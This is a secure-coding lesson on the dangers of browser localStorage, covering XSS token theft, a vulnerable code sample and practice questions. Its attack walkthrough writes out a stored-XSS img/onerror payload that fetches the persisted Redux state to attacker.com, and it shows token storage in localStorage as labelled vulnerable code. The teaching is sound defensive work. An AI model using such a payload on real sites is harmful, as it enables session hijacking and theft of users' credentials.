💡 CI03.2.2: The Public Notebook: Dangers of localStorage

**Outline:**

- **The Threat (SEEI):** A common misconception that `localStorage` is a secure, private, or "sandboxed" storage location. It is none of those things.
- **The Defense (PPP):** The principle of "Assume Local Storage is Public." Treat `localStorage` as a plain text file that is accessible to any script on your origin and anyone with physical access to the device.
- **Your Mission (Production):** Explain in detail how a simple XSS payload can steal all data from `localStorage`.

### 📘 Full Lesson Content

### Part 1: Presentation - The Threat (SEEI)

**What is it? (The Vulnerability):**

The vulnerability is **insecure storage by default**. `localStorage` is an incredibly convenient API for storing key-value pairs that persist across browser sessions. However, it was designed for convenience, not security. It has two critical weaknesses:

1. **It's Plain Text:** All data is stored as simple strings with no encryption. Anyone who can open the browser's developer tools can navigate to the "Application" tab and read everything you've stored.
2. **It's Shared Within an Origin:** Any JavaScript running on your domain (e.g., `https://your-app.com`) can read, write, and delete any data in `localStorage` for that domain. It's a single, shared bucket.

**How it Works (The Attack Vector):**

The most common attack vector against `localStorage` is **Cross-Site Scripting (XSS)**. If an attacker can inject a malicious script onto your page, they have full control over `localStorage`.

1. Your application uses `redux-persist` to save the state, including the sensitive `auth` slice, to `localStorage`. The stored object looks like this: `{"auth":"{\\"token\\":\\"eyJ...\\"}","cart":"{...}"}`.
2. Your application has a Stored XSS vulnerability in the comments section.
3. An attacker posts the following comment: `<img src=x onerror="fetch('<https://attacker.com/steal?data=>' + localStorage.getItem('persist:root'))">`
4. Another user views the page with the malicious comment.
5. The `onerror` script executes.
6. The script reads the entire persisted Redux state from `localStorage`.
7. It sends this data to the attacker's server.
8. The attacker now has the user's JWT and can hijack their session.

This entire attack is silent and invisible to the victim.

### Part 2: Practice - The Defense (PPP)

**The Golden Rule:**

**"Never store sensitive, unencrypted information in `localStorage`."** This is an absolute rule. Because `localStorage` is so vulnerable to XSS, you must treat it as an insecure public space. It's fine for non-sensitive data like a user's theme preference ('dark' or 'light'), but it is not an appropriate place for session tokens, PII, or API keys without an additional layer of protection.

**Secure Code Implementation (What NOT to do):**

This is the code that enables the attack.

```ts
// VULNERABLE CODE
// Storing a sensitive token directly
const handleLoginSuccess = (token) => {
  localStorage.setItem('authToken', token);
};

// Reading the token
const getToken = () => {
  return localStorage.getItem('authToken');
};

```

Any script on the page can call `getToken()` or `localStorage.getItem('authToken')` to steal the token. The defense isn't to change _this_ code, but to change _what_ you put into `localStorage`.

### 🤔 Reflective Questions

1. `sessionStorage` is another browser storage mechanism. It is cleared when the tab is closed. Is `sessionStorage` more secure than `localStorage` against XSS attacks? Why or why not?
2. Some developers advocate for storing JWTs in memory-only (e.g., a simple JavaScript variable) to avoid `localStorage` risks. What is the main UX downside of this approach?

### 📚 Further Reading

- **OWASP:** [HTML5 Security Cheat Sheet - Web Storage](https://www.google.com/search?q=https://cheatsheetseries.owasp.org/cheatsheets/HTML5_Security_Cheat_Sheet.html%23web-storage)
- **PortSwigger:** [Cross-site scripting (XSS) cheat sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet) - See the many ways an attacker can execute scripts to steal local data.

### 📝 Mini Task (Production)

You are reviewing an application's code and find the following line in the login success handler:

```ts
localStorage.setItem('user_profile', JSON.stringify(userObject));

```

The `userObject` contains the user's ID, name, email address, and profile picture URL.

Your task: Identify which pieces of information in this object are sensitive PII and explain in one sentence why storing this object in `localStorage` is a security risk.